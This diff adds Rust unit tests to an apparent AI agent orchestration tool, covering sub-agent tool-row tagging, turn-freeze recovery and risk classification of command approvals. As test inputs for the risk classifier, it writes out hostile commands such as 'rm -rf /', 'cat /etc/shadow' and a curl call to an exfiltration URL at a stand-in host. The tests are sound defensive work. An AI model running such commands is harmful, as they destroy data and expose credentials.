+        let call = test_tool_call("read_file", Vec::new());
+        let v = tool_row_content(&call, None);
+        assert_eq!(v["name"], "read_file");
+        assert!(v.get("agentThread").is_none());
+        assert!(v.get("collabThreads").is_none());
+    }
+
+    #[test]
+    fn tool_row_content_tags_a_sub_agents_own_call() {
+        // The exact review counterexample, from the OTHER side: the row itself
+        // (e.g. a sub-agent's own read_file) carries agentThread so it can
+        // never be confused with the lead's own mainline read_file.
+        let call = test_tool_call("read_file", Vec::new());
+        let v = tool_row_content(&call, Some("sub-1"));
+        assert_eq!(v["agentThread"], "sub-1");
+        assert!(v.get("collabThreads").is_none());
+    }
+
+    #[test]
+    fn tool_row_content_carries_collab_threads_for_the_anchor_row() {
+        // The collabAgentToolCall row ITSELF is mainline (issued by the lead —
+        // no agentThread), but carries collabThreads so the frontend can anchor
+        // that sub-agent's branch here.
+        let call = test_tool_call("collabAgentToolCall", vec!["sub-1".into(), "sub-2".into()]);
+        let v = tool_row_content(&call, None);
+        assert!(v.get("agentThread").is_none());
+        assert_eq!(v["collabThreads"], serde_json::json!(["sub-1", "sub-2"]));
+    }
 
     /// PersistedMeta roundtrip + tolerance: apply restores every last_* field,
     /// while empty/corrupt JSON leaves the fresh engine untouched.
@@ -6903,6 +7693,139 @@ mod tests {
         assert_eq!(STALL_HINT_DEFAULT_SECS, 480);
     }
 
+    // ── turn-freeze auto-recovery (issue #93) ──
+
+    #[test]
+    fn freeze_fires_when_busy_and_silent_past_threshold() {
+        assert!(freeze_verdict(true, 600, 600, false, false)); // exactly at threshold
+        assert!(freeze_verdict(true, 1200, 600, false, false)); // well past
+    }
+
+    #[test]
+    fn freeze_hidden_before_threshold() {
+        assert!(!freeze_verdict(true, 599, 600, false, false)); // one short of the boundary
+        assert!(!freeze_verdict(true, 0, 600, false, false));
+    }
+
+    #[test]
+    fn freeze_suppressed_while_waiting_on_human() {
+        // A turn blocked on a human ask is legitimately paused, not frozen — the
+        // watchdog must never auto-interrupt a turn that's waiting on a
+        // permission decision.
+        assert!(!freeze_verdict(true, 9999, 600, true, false));
+    }
+
+    #[test]
+    fn freeze_suppressed_while_tool_in_flight() {
+        // Review round 1, P0: a tool_use with no matching tool_result yet means
+        // claude/codex-exec are silently executing a (possibly long-running,
+        // legitimate) tool — cargo build, pnpm install, a large git clone — not
+        // frozen. However long the silence, this must never fire while true, or
+        // a healthy turn gets destructively interrupted and loses native context.
+        assert!(!freeze_verdict(true, 999_999, 600, false, true));
+    }
+
+    #[test]
+    fn freeze_hidden_when_idle() {
+        // No in-flight turn → never auto-recovered, however stale the clock reads.
+        assert!(!freeze_verdict(false, 9999, 600, false, false));
+    }
+
+    #[test]
+    fn freeze_disabled_when_threshold_zero() {
+        assert!(!freeze_verdict(true, 1_000_000, 0, false, false));
+    }
+
+    #[test]
+    fn turn_freeze_default_is_ten_minutes() {
+        // Regression sentinel: 600s (10 min) is a deliberate choice (issue #93),
+        // NOT a test-fast value. Trips if the production default is silently
+        // shortened (which would auto-interrupt turns that are merely slow, e.g.
+        // a multi-minute build/test tool call with no interim stdout).
+        assert_eq!(TURN_FREEZE_DEFAULT_SECS, 600);
+    }
+
+    #[test]
+    fn turn_freeze_threshold_fires_after_the_stall_hint() {
+        // Ordering invariant the watchdog sweep relies on: the visual "stalled"
+        // flag must always appear BEFORE the auto-recovery acts, so the user is
+        // never surprised by an action they had no warning of.
+        assert!(TURN_FREEZE_DEFAULT_SECS > STALL_HINT_DEFAULT_SECS);
+    }
+
+    #[test]
+    fn turn_freeze_threshold_stays_under_idle_watchdog_default() {
+        // Review round 1, P2: cross-module invariant — freeze must always fire
+        // well before the runaway guard's idle-kill cap does, or a future
+        // change to EITHER default could silently shadow freeze into dead code
+        // (idle_cap would always kill first, so freeze's own action never
+        // triggers) with no test going red to catch it.
+        assert!(TURN_FREEZE_DEFAULT_SECS < crate::commands::IDLE_WATCHDOG_DEFAULT_SECS);
+    }
+
+    #[tokio::test]
+    async fn clear_native_id_clears_the_lead_meta_row() {
+        let db = Db::connect("sqlite::memory:").await.unwrap();
+        let ws = repo::create_workspace(&db, "ws").await.unwrap();
+        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
+            .await
+            .unwrap();
+        repo::set_lead_native_id(&db, t.id, "old-native").await.unwrap();
+        assert_eq!(
+            repo::lead_native_id(&db, t.id).await.unwrap().as_deref(),
+            Some("old-native")
+        );
+
+        clear_native_id(&db, None, t.id).await.unwrap();
+
+        assert_eq!(repo::lead_native_id(&db, t.id).await.unwrap(), None);
+        // Clearing again (no meta row left) is a harmless no-op, not an error —
+        // the watchdog sweep must never fail loudly on a repeat/late tick.
+        clear_native_id(&db, None, t.id).await.unwrap();
+    }
+
+    #[tokio::test]
+    async fn turn_freeze_recovered_marker_roundtrips_for_the_lead() {
+        // Review round 1: originally intended as the issue #116 coordination
+        // point (review round 4, P2: #116 never wired up that consult — see
+        // the honest doc on `repo::mark_turn_freeze_recovered` — so this is
+        // just the marker's own round-trip today). No marker yet → None;
+        // after `mark_turn_freeze_recovered`, the getter returns a plausible
+        // unix-seconds timestamp (same clock as `repo::now`/`created_at`)
+        // close to "now".
+        let db = Db::connect("sqlite::memory:").await.unwrap();
+        let ws = repo::create_workspace(&db, "ws").await.unwrap();
+        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
+            .await
+            .unwrap();
+        assert_eq!(
+            repo::last_turn_freeze_recovery_secs(&db, t.id, None)
+                .await
+                .unwrap(),
+            None
+        );
+
+        repo::mark_turn_freeze_recovered(&db, t.id, None)
+            .await
+            .unwrap();
+
+        let stamped = repo::last_turn_freeze_recovery_secs(&db, t.id, None)
+            .await
+            .unwrap()
+            .expect("marker recorded");
+        let now = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+        assert!(now.saturating_sub(stamped) < 30, "stamp should read as ~now");
+        // A real row via the standard listing path (list_lead_messages does NOT
+        // filter by kind — the frontend's text/tool allowlist is what keeps it
+        // off the timeline, the same way "meta" rows already are today).
+        let rows = repo::list_lead_messages(&db, t.id).await.unwrap();
+        assert_eq!(rows.len(), 1);
+        assert_eq!(rows[0].kind, "turn_freeze_recovered");
+    }
+
     #[test]
     fn ask_blocks_scopes_lead_by_thread() {
         // Worker ask matches its own (globally-unique) direction id.
@@ -7066,13 +7989,15 @@ mod tests {
     }
 
     /// Issue #89: `codex_approval_fields` produces the (tool, summary, detail,
-    /// action_key) quadruple for every approval kind, with `action_key` always
-    /// exact even where `summary` truncates for display.
+    /// risk, action_key) quintuple for every approval kind, with `action_key`
+    /// always exact even where `summary` truncates for display. issue #101:
+    /// `risk` is computed by the same shared `classify_risk` every branch
+    /// routes through.
     #[test]
     fn codex_approval_fields_action_key_is_exact_and_summary_may_truncate() {
         // Bash: summary truncates to the first line; action_key carries the full
         // multi-line command (mirrors bus::server::summarize's claude shape).
-        let (tool, summary, detail, key) = codex_approval_fields(
+        let (tool, summary, detail, risk, key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "npm test\nrm -rf /", "cwd": "/repo"}),
         );
@@ -7080,8 +8005,9 @@ mod tests {
         assert_eq!(summary, "Run: npm test");
         assert_eq!(detail, "npm test\nrm -rf /");
         assert!(key.contains("rm -rf /"));
+        assert_eq!(risk, crate::ask::RiskLevel::Write);
         // A different multi-line command sharing the same first line differs in key.
-        let (_, summary2, _, key2) = codex_approval_fields(
+        let (_, summary2, _, _risk2, key2) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "npm test\necho safe"}),
         );
@@ -7089,33 +8015,37 @@ mod tests {
         assert_ne!(key2, key);
 
         // Network: keyed by host — network FIRST beats the commandExecution method.
-        let (tool, summary, _detail, key) = codex_approval_fields(
+        let (tool, summary, _detail, risk, key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"networkApprovalContext": {"host": "example.com"}}),
         );
         assert_eq!(tool, "Network");
         assert_eq!(summary, "network access: example.com");
         assert_eq!(key, crate::ask::action_key(&["Network", "example.com"]));
+        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
 
         // Edit: action_key carries the FULL path list even beyond the 3-path cap.
-        let (tool, summary, _detail, key) = codex_approval_fields(
+        let (tool, summary, _detail, risk, key) = codex_approval_fields(
             "applyPatchApproval",
             &serde_json::json!({"changes": [{"path":"a"},{"path":"b"},{"path":"c"},{"path":"d"}]}),
         );
         assert_eq!(tool, "Edit");
         assert_eq!(summary, "apply file changes: a, b, c +1");
         assert!(key.contains('d'));
+        assert_eq!(risk, crate::ask::RiskLevel::Write);
 
         // Permission: summary truncates the scope at 120 chars; action_key (and
-        // detail) keep it whole.
+        // detail) keep it whole. No recognizable marker in the scope → honestly
+        // Unknown, never a guessed-safe ReadOnly for a permission ESCALATION.
         let long_scope = "x".repeat(200);
-        let (tool, summary, detail, key) = codex_approval_fields(
+        let (tool, summary, detail, risk, key) = codex_approval_fields(
             "elicitation/permissions",
             &serde_json::json!({"permissions": {"note": long_scope}}),
         );
         assert_eq!(tool, "Permission");
         assert!(summary.len() < detail.len());
         assert_eq!(key, crate::ask::action_key(&["Permission", &detail]));
+        assert_eq!(risk, crate::ask::RiskLevel::Unknown);
     }
 
     /// Same collision class as `bus::server`'s round-2 finding, mirrored on the
@@ -7127,11 +8057,59 @@ mod tests {
     /// built by the same one canonical, provably-injective encoding.
     #[test]
     fn codex_approval_fields_action_key_uses_the_shared_collision_resistant_encoding() {
-        let (_, _, _, bash_key) = codex_approval_fields(
+        let (_, _, _, _risk, bash_key) = codex_approval_fields(
             "codex/commandExecution",
             &serde_json::json!({"command": "echo hi"}),
         );
         assert_eq!(bash_key, crate::ask::action_key(&["Bash", "echo hi"]));
+    }
+
+    /// issue #101: a permission-scope escalation that DOES spell out a
+    /// recognizable signal is classified accordingly rather than falling to
+    /// Unknown — the honest-default only applies when nothing matches.
+    #[test]
+    fn codex_approval_fields_permission_scope_with_network_marker_is_classified() {
+        let (_, _, _, risk, _) = codex_approval_fields(
+            "elicitation/permissions",
+            &serde_json::json!({"permissions": {"network": "enabled"}}),
+        );
+        assert_eq!(risk, crate::ask::RiskLevel::NetworkOrCredential);
+    }
+
+    /// Round-2 review (issue #101 P3): the hook-driven engines
+    /// (`bus::server::summarize`) and Codex's native app-server path
+    /// (`codex_approval_fields`) both feed the SAME raw command text into
+    /// the SAME shared `classify_risk`, so the same command must classify
+    /// identically no matter which engine ran it — a human comparing two
+    /// Needs-you cards for the "same" command across a Claude worker and a
+    /// Codex worker must never see two different colors. This is a
+    /// regression test protecting that structural guarantee: nothing here
+    /// exercises a NEW code path, but a future one-sided change (e.g. Codex
+    /// prefixing the command with `cwd`, or a hook-side-only tweak to
+    /// `summarize`) would silently break it without this test.
+    #[test]
+    fn command_risk_is_consistent_across_bus_summarize_and_codex_approval_fields() {
+        for cmd in [
+            "npm test",
+            "git status",
+            "ls -la",
+            "curl https://evil.example/exfiltrate",
+            "git branch -D important-work",
+            "find . -name '*.tmp' -delete",
+            "ls | rm -rf /tmp/x",
+            "cat /etc/shadow",
+        ] {
+            let (_, _, hook_risk, _) =
+                crate::bus::server::summarize("Bash", Some(&serde_json::json!({"command": cmd})));
+            let (_, _, _, codex_risk, _) = codex_approval_fields(
+                "codex/commandExecution",
+                &serde_json::json!({"command": cmd}),
+            );
+            assert_eq!(
+                hook_risk, codex_risk,
+                "{cmd:?} must classify identically across both engines"
+            );
+        }
     }
 
     #[test]
@@ -7258,6 +8236,218 @@ mod tests {
 
         assert!(reset_failed_hidden_turn(&mut inner, old_turn).is_none());
         assert!(inner.turn.busy);
+    }
+
+    /// Round-2 P1 regression (PR #118): `recover_from_freeze`'s app-server
+    /// reset must actually clear `busy`/`tool_rows`/`current`/`open_texts`/
+    /// `interrupting` — the exact fields `codex_consumer`'s (deliberately
+    /// skipped, see `still_active`) disconnect cleanup would have cleared —
+    /// so a subsequent send is NOT silently queued forever behind a turn
+    /// that will never end. `try_begin_send` is the actual decision point
+    /// `send()` uses to choose "write now" vs "enqueue"; asserting it
+    /// returns true here is the literal ask from review round 2.
+    #[test]
+    fn reset_frozen_appserver_turn_clears_state_and_unblocks_next_send() {
+        let mut inner = test_inner("codex");
+        inner.turn.busy = true;
+        inner.turn_id = 5;
+        inner.interrupting = true; // set by `interrupt()` just before this fires
+        inner.current_origin_tag = Some("im-reply-target".into());
+        inner.current = Some((10, "partial reply".into(), std::time::Instant::now()));
+        // agent_thread: Some(..) — issue #99: a sub-agent's own stream freezing
+        // mid-turn must keep its tag through this reset path too, exactly like
+        // cleanup_disconnected_turn / stop_quiet.
+        inner.open_texts.insert(
+            "item-1".into(),
+            OpenTextRow {
+                row: 11,
+                buf: "parallel stream".into(),
+                last_flush: std::time::Instant::now(),
+                agent_thread: Some("sub-1".into()),
+            },
+        );
+        inner
+            .tool_rows
+            .insert("call-1".into(), (12, serde_json::json!({"tool": "bash"})));
+        inner.turn.queue.push_back(Outgoing {
+            text: "follow-up sent during the freeze".into(),
+            images: vec![],
+            tracked: true,
+            origin_tag: None,
+            queue_id: Some(99),
+            has_attachments: false,
+        });
+
+        let drain = reset_frozen_appserver_turn(&mut inner, 5).expect("same turn, still busy");
+
+        // Idle and resumable, NOT stop_quiet's harder `stopped=true` state.
+        assert!(!inner.turn.busy);
+        assert!(!inner.stopped);
+        assert!(!inner.interrupting);
+        assert!(inner.tool_rows.is_empty());
+        assert!(inner.open_texts.is_empty());
+        assert!(inner.current.is_none());
+        assert!(inner.turn.queue.is_empty());
+        assert!(inner.current_origin_tag.is_none());
+        // "Continuity reset", not a STOP: reset_epoch stays put so an
+        // in-flight Phase 1 -> Phase 3 send still promotes cleanly onto this
+        // fresh idle engine instead of being invalidated (see the doc
+        // comment on `reset_frozen_appserver_turn`).
+        assert_eq!(inner.reset_epoch, 0);
+        // The literal ask from review round 2: a subsequent send must NOT be
+        // silently queued behind the (now-abandoned) frozen turn.
+        assert!(inner.turn.try_begin_send());
+
+        assert_eq!(drain.current, Some((10, "partial reply".into())));
+        assert_eq!(
+            drain.orphan_texts,
+            vec![(11, "parallel stream".into(), Some("sub-1".into()))]
+        );
+        assert_eq!(
+            drain.orphan_tools,
+            vec![(12, serde_json::json!({"tool": "bash"}))]
+        );
+        assert_eq!(drain.drained_queue, vec![99]);
+    }
+
+    /// A very-delayed clean TurnEnd (or a promoted queued send) can advance
+    /// `turn_id` while `interrupt()`'s RPC is still in flight — its ~120s
+    /// worst case is the whole reason this recovery path exists. The reset
+    /// must not destroy a newer, unrelated turn's state.
+    #[test]
+    fn reset_frozen_appserver_turn_ignores_a_newer_turn() {
+        let mut inner = test_inner("codex");
+        inner.turn.busy = true;
+        inner.turn_id = 6;
+        inner
+            .tool_rows
+            .insert("call-1".into(), (1, serde_json::json!({"tool": "bash"})));
+
+        assert!(reset_frozen_appserver_turn(&mut inner, 5).is_none());
+
+        assert!(inner.turn.busy);
+        assert!(!inner.tool_rows.is_empty());
+    }
+
+    /// The frozen turn may have ended cleanly on its own (a delayed TurnEnd
+    /// landing between the freeze verdict and this reset running) — the
+    /// normal TurnEnd handler already reset everything correctly in that
+    /// case, so this must be a no-op rather than a redundant/conflicting one.
+    #[test]
+    fn reset_frozen_appserver_turn_ignores_an_already_idle_turn() {
+        let mut inner = test_inner("codex");
+        inner.turn_id = 5;
+        inner.turn.busy = false;
+
+        assert!(reset_frozen_appserver_turn(&mut inner, 5).is_none());
+    }
+
+    /// Review round 4, P2 (mutation-proofing): the three `reset_frozen_
+    /// appserver_turn_*` tests above only exercise that PURE leaf function —
+    /// mutation-testing showed a whole mutant class survives that guts
+    /// `recover_from_freeze`'s actual CALL into it, since nothing asserted
+    /// the wiring itself. This test instead drives `take_frozen_turn` — the
+    /// exact async function `recover_from_freeze` calls — over a REAL
+    /// `EngineRef` (an `Arc<Mutex<EngineInner>>`; needs no `AppHandle`, see
+    /// that type's doc), with a genuine `codex_app_server::Client` occupying
+    /// `codex_client` (via the test-only `Client::test_stub`). Gutting
+    /// EITHER the take or the `reset_frozen_appserver_turn` call inside
+    /// `take_frozen_turn` turns this red. The `tokio::time::timeout` also
+    /// guards against a self-deadlock regression (the exact bug class the
+    /// old two-lock take-then-relock shape risked).
+    #[tokio::test]
+    async fn take_frozen_turn_claims_client_and_resets_state_for_the_matching_turn() {
+        let mut inner = test_inner("codex");
+        inner.turn.busy = true;
+        inner.turn_id = 5;
+        inner.codex_client = Some(crate::codex_app_server::Client::test_stub());
+        inner
+            .tool_rows
+            .insert("call-1".into(), (1, serde_json::json!({"tool": "bash"})));
+        inner.turn.queue.push_back(Outgoing {
+            text: "follow-up sent during the freeze".into(),
+            images: vec![],
+            tracked: true,
+            origin_tag: None,
+            queue_id: Some(42),
+            has_attachments: false,
+        });
+        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));
+
+        let claim = tokio::time::timeout(std::time::Duration::from_secs(5), take_frozen_turn(&eng, 5))
+            .await
+            .expect("take_frozen_turn must not hang/self-deadlock");
+
+        let FreezeClaim::Owned(Some((client, drain))) = claim else {
+            panic!("expected an owned claim carrying the taken app-server client");
+        };
+        // The client was ACTUALLY removed from the engine, not merely
+        // observed — the literal wiring the review round 4 mutation broke.
+        assert!(eng.lock().await.codex_client.is_none());
+        assert!(!eng.lock().await.turn.busy);
+        assert!(eng.lock().await.tool_rows.is_empty());
+        assert!(eng.lock().await.turn.queue.is_empty());
+        assert_eq!(
+            drain.orphan_tools,
+            vec![(1, serde_json::json!({"tool": "bash"}))]
+        );
+        assert_eq!(drain.drained_queue, vec![42]);
+        client.shutdown().await;
+    }
+
+    /// The literal review round 4 P1 scenario: `interrupt()`'s up-to-~120s
+    /// RPC wait let `codex_consumer`'s flush branch advance `turn_id` (a
+    /// NEWER turn is now live on the SAME shared `codex_client`) before
+    /// `recover_from_freeze` resumes. `take_frozen_turn` must report `Stale`
+    /// and leave the newer turn's client + busy state completely untouched —
+    /// an earlier version took + shut the connection down regardless,
+    /// permanently wedging the newer turn (busy forever, no client left to
+    /// ever finish or clean it up).
+    #[tokio::test]
+    async fn take_frozen_turn_leaves_a_newer_turns_client_untouched() {
+        let mut inner = test_inner("codex");
+        inner.turn.busy = true;
+        inner.turn_id = 6; // advanced past the frozen turn_id=5 being recovered
+        inner.codex_client = Some(crate::codex_app_server::Client::test_stub());
+        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));
+
+        let claim = tokio::time::timeout(std::time::Duration::from_secs(5), take_frozen_turn(&eng, 5))
+            .await
+            .expect("take_frozen_turn must not hang/self-deadlock");
+
+        assert!(matches!(claim, FreezeClaim::Stale));
+        // The newer turn's live connection and busy state are untouched.
+        let mut guard = eng.lock().await;
+        assert!(guard.turn.busy);
+        let client = guard.codex_client.take().expect("client left in place, untouched");
+        drop(guard);
+        client.shutdown().await;
+    }
+
+    /// Non-app-server dialects (claude resident / codex-exec / opencode)
+    /// never populate `codex_client` — the atomic guard must still gate on
+    /// turn_id+busy for them (review round 4 P1: previously it didn't gate
+    /// AT ALL for this case — `recover_from_freeze` ran its native-id-clear +
+    /// marker + user notice unconditionally), reporting `Owned(None)` — NOT
+    /// `Stale`, since the turn genuinely still is the one being recovered.
+    /// It must NOT also reset turn state here: that dialect's own reader
+    /// task resets it via its own EOF/`generation` path once `interrupt()`'s
+    /// kill lands, and doing it twice would race that cleanup.
+    #[tokio::test]
+    async fn take_frozen_turn_reports_owned_none_without_an_appserver_client() {
+        let mut inner = test_inner("claude");
+        inner.turn.busy = true;
+        inner.turn_id = 5;
+        let eng: EngineRef = Arc::new(tokio::sync::Mutex::new(inner));
+
+        let claim = tokio::time::timeout(std::time::Duration::from_secs(5), take_frozen_turn(&eng, 5))
+            .await
+            .expect("take_frozen_turn must not hang/self-deadlock");
+
+        assert!(matches!(claim, FreezeClaim::Owned(None)));
+        // Still busy — this function never resets state when there's no
+        // client to take; that stays the reader task's job for this dialect.
+        assert!(eng.lock().await.turn.busy);
     }
 
     #[tokio::test]
